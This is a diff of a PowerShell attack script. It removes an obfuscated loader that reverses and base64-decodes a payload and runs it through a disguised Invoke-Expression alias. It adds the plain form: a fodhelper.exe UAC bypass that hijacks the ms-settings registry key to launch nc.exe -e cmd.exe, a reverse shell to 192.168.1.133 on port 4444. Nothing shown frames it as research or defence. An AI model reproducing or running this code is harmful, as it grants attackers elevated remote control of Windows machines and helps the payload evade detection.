@@ -1,11 +1,5 @@
-$best64code = "oQDiUGel5iclBHblhGZvZGXyMTblR3c5NFXzd3bk5WaXxlODJCIzNXZj9mcQ1CdyFGdTpQDiQDN0QDIzMTMuEjL4YTMuITOxASZ4VmLk12YgUWLgUGel5yYuxFXzt2chRFXcN3dvRmbpdFXcpzQiASZ1xWYW1CIikCdsVXYmVGZoICIl1WYO1CIoRXYwRCIoRXYQ1CI5RnclB3byBVblRXStQXZTpQDiICIlVHbhZVLgISZ0V3YlhXRlRXYnVGblRkIgUWbh5ULggGdhBHJggGdhBVLgkHdyVGcvJHUtVGdJ1CdlNlCNU2Yy9mRtACa0FGckACa0FGUtASblRXStcXZOpQDiQmbh1WbvNGXuVGcPxFbsVGaTx1cn5Wa0RXZz1yctx1clN3chx2QcVmchdHdm92UcpTVDtESiASPggGdhBHJ/u77" ;
-$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
-$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
-$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
-$RandomSTR64 = '40TpN3clJFc4VULFt0TW5WS'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
-$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
-$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
-$aliasSTR64 = 'QaTV1R'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
-$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
-$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
-$NULL = nEW-AlIaS -naME $AlIasFInAL -vAlue $ieXcMD -FOrce ; & $alIASFiNAl $lOadCodE ;
+$path = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+New-Item -Path $path -Force
+Set-ItemProperty -Path $path -Name "DelegateExecute" -Value ""
+Set-ItemProperty -Path $path -Name "(default)" -Value "C:\\Windows\\Tasks\\nc.exe -e cmd.exe 192.168.1.133 4444"
+Start-Process "C:\Windows\System32\fodhelper.exe"
